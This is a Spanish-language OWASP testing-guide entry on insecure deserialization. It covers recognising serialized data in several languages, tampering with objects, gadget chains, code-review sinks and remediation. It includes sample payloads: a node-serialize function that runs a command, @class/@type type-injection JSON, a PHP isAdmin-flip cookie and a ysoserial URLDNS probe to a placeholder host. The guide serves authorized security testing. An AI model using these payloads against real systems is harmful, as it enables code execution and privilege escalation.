Deserialización insegura

ID
WSTG-INJT-23

Resumen

La serialización de datos es el proceso de convertir un objeto en un formato que pueda almacenarse (por ejemplo, en un archivo o base de datos) o transmitirse (por ejemplo, a través de una red) y reconstruirse más tarde. La deserialización es el proceso inverso: tomar datos estructurados en algún formato y reconstruirlos como un objeto.

La deserialización insegura ocurre cuando una aplicación deserializa datos no confiables sin verificar lo suficiente que los datos resultantes serán válidos. Los atacantes pueden aprovechar esto para manipular objetos serializados con el fin de influir en el comportamiento de la aplicación o desencadenar acciones no previstas durante el proceso de deserialización.

El impacto más crítico de la deserialización insegura es la ejecución remota de código (RCE). Sin embargo, también puede resultar en denegación de servicio (DoS), elusión de autenticación, problemas de control de acceso o abuso de la lógica de la aplicación.

El JSON que se mezcla en objetos en entornos de ejecución de JavaScript también puede habilitar la contaminación de prototipos. Se debe tratar eso como un caso de prueba relacionado y no como un formato de deserialización independiente.

Objetivos de la prueba

  • Identificar los puntos de entrada donde la aplicación acepta objetos serializados de fuentes no confiables (por ejemplo, cabeceras HTTP, parámetros o cookies).
  • Determinar el formato de serialización utilizado por la aplicación.
  • Evaluar si la entrada serializada se valida o restringe antes de la deserialización.
  • Evaluar si la manipulación de los datos serializados conduce a un comportamiento inseguro o a un impacto en la seguridad.

Cómo probar

Pruebas de caja negra

Identificación de datos serializados

Se identifica dónde procesa la aplicación datos serializados. Se inspeccionan las cookies, los campos ocultos, los cuerpos de las API, las cabeceras y las cargas de archivos en busca de patrones, codificaciones o características estructurales reconocibles.

Serialización de Java

Los objetos serializados de Java normalmente comienzan con los bytes hexadecimales AC ED 00 05. Cuando se codifican en base64, esto frecuentemente aparece como rO0.

Cookie: rememberMe=rO0ABXNyABpY...
Serialización de PHP

La serialización de PHP es legible para los humanos y utiliza caracteres específicos para representar los tipos de datos (por ejemplo, O para objeto, a para arreglo, s para cadena).

Cookie: user_data=O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"isAdmin";b:1;}
Python Pickle

Python pickle es un formato binario que puede ser más difícil de reconocer visualmente. Los payloads del protocolo 0 son más legibles y a menudo terminan con un punto (.). Los protocolos superiores parecen blobs binarios opacos o en base64 en cookies, tokens o parámetros de trabajos/colas.

Después de identificar (fingerprinting) un candidato, se envía una sonda controlada fuera de banda (OOB) o un fallo benigno generado para pickle (por ejemplo, un payload que realice una llamada DNS o HTTP a un servidor que usted controle). Se confirma si la aplicación deserializa el valor observando la llamada de retorno (callback), un error distintivo o un bloqueo del proceso. Nunca se debe comenzar con un payload de RCE destructivo.

Node.js (node-serialize)

En aplicaciones Node.js que usan la biblioteca node-serialize, los datos serializados suelen representarse como una cadena similar a JSON. Un indicador clave de riesgo es un marcador de expresión de función invocada inmediatamente (IIFE) que comienza con _$$ND_FUNC$$_.

{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id')}()"}

Si se observa este marcador en el tráfico de la aplicación, se reemplaza el cuerpo de la función por una llamada de retorno OOB inofensiva y se vuelve a enviar para confirmar la ejecución.

Serialización de .NET

Las aplicaciones heredadas que aún usan BinaryFormatter o NetDataContractSerializer suelen codificar la salida en base64. Un patrón común para datos serializados de .NET comienza con los bytes hexadecimales 00 01 00 00 00 FF FF FF FF o con la cadena base64 AAEAAAD/////. Se debe tratar BinaryFormatter como de uso exclusivamente heredado; está obsoleto y ha sido eliminado del .NET moderno.

Cookie: SessionData=AAEAAAD/////AQAAAAAAAAAMAgAAAF...
Deserialización basada en JSON con metadatos de tipo

Algunas bibliotecas JSON admiten tipado polimórfico. Si se aceptan metadatos de tipo controlados por el atacante, la deserialización puede instanciar clases inesperadas.

Jackson con tipado por defecto (default typing) a menudo incluye un identificador de tipo como @class:

{"@class":"com.example.Exploit","cmd":"id"}

Fastjson comúnmente usa @type:

{"@type":"com.example.Exploit","cmd":"id"}

Se debe tratar los especificadores de tipo @class, @type o similares controlados por el atacante como un hallazgo de alta prioridad, y luego confirmar con un gadget OOB seguro para esa biblioteca.

Manipulación de objetos serializados

Una vez identificado un punto de entrada, se modifican los datos serializados y se observa cómo responde la aplicación.

Las técnicas comunes de manipulación incluyen:

  • Cambiar atributos o indicadores (flags) del objeto.
  • Inyectar campos adicionales.
  • Modificar tipos de datos.
  • Reproducir (replay) payloads serializados modificados.

Ejemplo (PHP):

Un objeto serializado que representa el estado de un usuario:

O:4:"User":2:{s:8:"username";s:3:"bob";s:8:"isAdmin";b:0;}

Si la aplicación depende de este objeto para tomar decisiones de autorización, se cambia b:0; por b:1; y se vuelve a enviar. La escalada de privilegios confirma una confianza insegura en el objeto deserializado. Al editar longitudes de cadenas o de arreglos, se deben mantener coherentes los prefijos de longitud de la serialización de PHP, o el analizador rechazará el payload.

Efectos secundarios peligrosos

Se comprueba si la deserialización desencadena un comportamiento no previsto, como:

  • Ejecución de comandos del sistema.
  • Invocación de funcionalidad interna de la aplicación.
  • Consumo excesivo de recursos (memoria, CPU).
  • Bloqueos de la aplicación o cambios de estado inesperados.

Se busca evidencia a través de:

  • Cambios de comportamiento en las respuestas.
  • Mensajes de error o trazas de pila (stack traces).
  • Anomalías de tiempo o degradación del servicio.
  • Llamadas de retorno DNS o HTTP OOB provenientes de payloads de sonda seguros.

Abuso de cadenas de gadgets

En muchos entornos, las vulnerabilidades de deserialización requieren una cadena de gadgets: una secuencia de fragmentos de código existentes (gadgets) dentro de la aplicación o sus dependencias que, durante la reconstrucción, producen un resultado malicioso.

Se prueba con esta secuencia:

  1. Identificar las bibliotecas de terceros en uso (por ejemplo, Commons Collections, Spring o Jackson) a partir de cabeceras, errores, archivos de dependencias o herramientas de identificación (fingerprinting).
  2. Generar un payload de confirmación no destructivo con una herramienta especializada.
  3. Enviar el payload al sink de datos serializados y vigilar una llamada de retorno OOB. La RCE a menudo no produce un cuerpo de respuesta directo, por lo que las llamadas de retorno DNS o HTTP son la señal fiable.

Ejemplo (Java, usando el gadget URLDNS de ysoserial solo para confirmación):

java -jar ysoserial.jar URLDNS http://<collaborator-host>/

Se codifica en base64 la salida sin procesar si la aplicación espera base64, se coloca en el parámetro o la cookie candidata y se vuelve a enviar. Una consulta DNS para <collaborator-host> confirma que la aplicación deserializó el objeto. Los gadgets de RCE se deben usar únicamente después de la confirmación y solo en entornos de prueba autorizados.

Para PHP, se usa PHPGGC para generar un payload de prueba equivalente OOB o de escritura de archivos para una cadena de gadgets conocida presente en la aplicación.

Pruebas de caja blanca

Revisión de código y funciones sink

Cuando se dispone del código fuente, no hay que detenerse en encontrar los sinks. Se rastrea la entrada no confiable hasta cada sink y se verifica qué controles existen.

Los sinks comunes incluyen:

  • Java: java.io.ObjectInputStream.readObject(), readUnshared()
  • PHP: unserialize()
  • Python: pickle.loads(), marshal.loads(), shelve.open()
  • Node.js: node-serialize.unserialize()
  • .NET: BinaryFormatter.Deserialize(), NetDataContractSerializer.Deserialize()

Para cada sink:

  1. Confirmar si los parámetros de la petición, las cookies, las cabeceras, los archivos o los mensajes de cola llegan hasta él.
  2. Comprobar si existen listas de permitidos de clases autorizadas, comprobaciones de integridad (por ejemplo, HMAC) o filtros de la plataforma como el ObjectInputFilter de Java.
  3. Anotar los controles ausentes, las listas de permitidos demasiado amplias o las firmas que el cliente puede eludir.

ValidatingObjectInputStream de Apache Commons IO es un enfoque de lista de permitidos para Java; es preferible documentar el filtro que realmente use la base de código, incluida la configuración de ObjectInputFilter del JDK.

Corrección

Evite deserializar datos no confiables siempre que sea posible.

Si la deserialización es necesaria:

  • Restrinja los formatos de serialización y los tipos de objeto aceptados mediante una lista de permitidos estricta.
  • Implemente controles de integridad para detectar manipulaciones.
  • Aplique validación antes de que ocurra la deserialización.
  • Prefiera formatos de solo datos, como JSON o XML, analizados sin metadatos de tipo controlados por el atacante ni tipado polimórfico.
  • Para Java, aplique un ObjectInputFilter o un mecanismo de lista de permitidos como el ValidatingObjectInputStream de Commons IO antes de que se instancien las clases.
  • Si los objetos serializados deben pasarse al cliente, fírmelos (por ejemplo, con HMAC) para que el servidor pueda rechazar los payloads modificados.
  • No use el BinaryFormatter heredado de .NET con datos no confiables.

Consulte la OWASP Deserialization Cheat Sheet para obtener una guía de corrección más detallada.

Herramientas

  • ysoserial - genera payloads de deserialización de Java
  • ysoserial.net - genera payloads de deserialización de .NET
  • PHPGGC - cadenas de gadgets y generador de payloads para PHP
  • Freddy, Deserialization Bug Finder - extensión de Burp para la detección de deserialización en Java y .NET
  • Java Deserialization Scanner - extensión de Burp para el escaneo y la explotación de deserialización en Java
